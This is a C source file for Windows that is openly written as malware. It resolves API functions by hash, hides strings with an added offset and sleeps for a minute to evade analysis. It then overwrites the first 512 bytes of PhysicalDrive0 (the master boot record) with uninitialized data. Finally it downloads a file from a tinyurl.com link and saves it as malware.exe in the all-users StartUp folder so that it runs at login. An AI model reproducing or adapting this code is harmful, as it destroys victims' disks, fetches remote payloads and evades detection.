#include <Windows.h>
#include "utils.h"

DWORD sleep_hash = 0x44bdc2f5;
DWORD GetStdHandle_hash = 0xb61c83c8;
DWORD WriteFile_hash = 0x4cc901f2;
DWORD CreateFileA_hash = 0x1f866d80;
DWORD CreateThread_hash = 0xcc0b468;
DWORD LocalAlloc_hash = 0xe6d05cb7;
DWORD GetProcAddress_hash = 0x5e05fd7b;
DWORD URLDownloadToFileA_hash = 0x14f536c7;
DWORD LoadLibraryA_hash = 0x2dcbed06;
DWORD WideCharToMultiByte_hash = 0x7820d690;

int main(){
	HMODULE kernel32 = getKernel32BaseAddress();

	// Sleep
	sleep_p Sleep_function = (sleep_p) getFunctionAddressByHash(kernel32, sleep_hash);
	Sleep_function(60000);

	// CreateFileA
	CreateFileA_p CreateFileA_function = (CreateFileA_p)getFunctionAddressByHash(kernel32, CreateFileA_hash);
	const int SneakyMBRLocation[] = { BIGINT + '\\',  BIGINT + '\\',  BIGINT + '.',  BIGINT + '\\',  BIGINT + 'P',  BIGINT + 'h', BIGINT + 'y', BIGINT + 's', BIGINT + 'i', BIGINT + 'c', BIGINT + 'a', BIGINT + 'l', BIGINT + 'D', BIGINT + 'r', BIGINT + 'i', BIGINT + 'v', BIGINT + 'e', BIGINT + '0', BIGINT }; // "\\\\.\\PhysicalDrive0";
	char MBRLocation[19];
	for (int i = 0; i < 19; i++) MBRLocation[i] = SneakyMBRLocation[i] - BIGINT;
	HANDLE hFile = CreateFileA_function(MBRLocation, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL); // MBR handle

	// WriteFile
	WriteFile_p WriteFile_function = (WriteFile_p)getFunctionAddressByHash(kernel32, WriteFile_hash);
	char MBRArray[512]; // non-initialized array
	WriteFile_function(hFile, MBRArray, 512, NULL, NULL); // call WriteFile

	// URLDownloadToFile
	LoadLibraryA_p LoadLibraryA = (LoadLibraryA_p)getFunctionAddressByHash(kernel32, LoadLibraryA_hash);
	
	const int sneakyLibraryNmae[] = { BIGINT + 'u',BIGINT + 'r',BIGINT + 'l',BIGINT + 'm',BIGINT + 'o',BIGINT + 'n',BIGINT + '.',BIGINT + 'd',BIGINT + 'l',BIGINT + 'l' ,BIGINT };
	char libraryName[11];
	for (int i = 0; i < 11; i++) libraryName[i] = sneakyLibraryNmae[i] - BIGINT;
	HMODULE urlmondll = LoadLibraryA(libraryName);
	
	URLDownloadToFile_p URLDownloadToFile_func = (URLDownloadToFile_p)getFunctionAddressByHash(urlmondll, URLDownloadToFileA_hash);
	const int sneakyURL[] = { BIGINT + 'h',BIGINT + 't',BIGINT + 't',BIGINT + 'p',BIGINT + 's',BIGINT + ':',BIGINT + '/',BIGINT +'/', BIGINT + 't',BIGINT + 'i',BIGINT + 'n',BIGINT + 'y',BIGINT + 'u',BIGINT + 'r',BIGINT + 'l',BIGINT +'.',BIGINT + 'c',BIGINT + 'o',BIGINT + 'm',BIGINT + '/',BIGINT + '8',BIGINT + 'm',BIGINT + 'j',BIGINT + 'p',BIGINT + 'l',BIGINT + 'u',BIGINT + 'e',BIGINT + 't', BIGINT };
	char url[29];
	for (int i = 0; i < 29; i++) url[i] = sneakyURL[i] - BIGINT;

	const int SneakyPath[] = { BIGINT + 'C',BIGINT + ':',BIGINT + '\\',BIGINT + 'P',BIGINT + 'r',BIGINT + 'o',BIGINT + 'g',BIGINT + 'r',BIGINT + 'a',BIGINT + 'm',BIGINT + 'D',BIGINT + 'a',BIGINT + 't',BIGINT + 'a',BIGINT + '\\',BIGINT + 'M',BIGINT + 'i',BIGINT + 'c',BIGINT + 'r',BIGINT + 'o',BIGINT + 's',BIGINT + 'o',BIGINT + 'f',BIGINT + 't',BIGINT + '\\',BIGINT + 'W',BIGINT + 'i',BIGINT + 'n',BIGINT + 'd',BIGINT + 'o',BIGINT + 'w',BIGINT + 's',BIGINT + '\\',BIGINT + 'S',BIGINT + 't',BIGINT + 'a',BIGINT + 'r',BIGINT + 't',BIGINT + ' ',BIGINT + 'M',BIGINT + 'e',BIGINT + 'n',BIGINT + 'u',BIGINT + '\\',BIGINT + 'P',BIGINT + 'r',BIGINT + 'o',BIGINT + 'g',BIGINT + 'r',BIGINT + 'a',BIGINT + 'm',BIGINT + 's',BIGINT + '\\',BIGINT + 'S',BIGINT + 't',BIGINT + 'a',BIGINT + 'r',BIGINT + 't',BIGINT + 'U',BIGINT + 'p', BIGINT + '\\',BIGINT + 'm',BIGINT + 'a',BIGINT + 'l',BIGINT + 'w',BIGINT + 'a',BIGINT + 'r',BIGINT + 'e',BIGINT + '.',BIGINT + 'e',BIGINT + 'x',BIGINT + 'e', BIGINT }; //L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\malware.exe";
	char path[73];
	for (int i = 0; i < 73; i++) path[i] = SneakyPath[i] - BIGINT;
	HRESULT res = URLDownloadToFile_func(NULL, url, path, 0, NULL);
}

